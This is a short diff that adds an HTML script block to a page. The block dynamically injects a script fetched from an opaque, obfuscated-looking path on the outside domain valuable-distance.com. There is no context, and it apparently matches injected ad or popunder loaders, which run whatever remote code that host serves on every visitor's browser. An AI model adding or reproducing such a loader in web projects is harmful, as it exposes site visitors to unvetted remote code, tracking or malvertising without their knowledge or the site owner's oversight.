@@ -1,0 +1,12 @@
+<script>
+(function(nore){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = nore || {};
+s.src = "\/\/valuable-distance.com\/brX.VusddtGBlU0mYkWYcZ\/yeEm_9suAZ\/UvlRklPYTyYM2qNRzlEs0XO\/DqEhtdNEjbYd3tMST\/Qt4LM_gJ";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
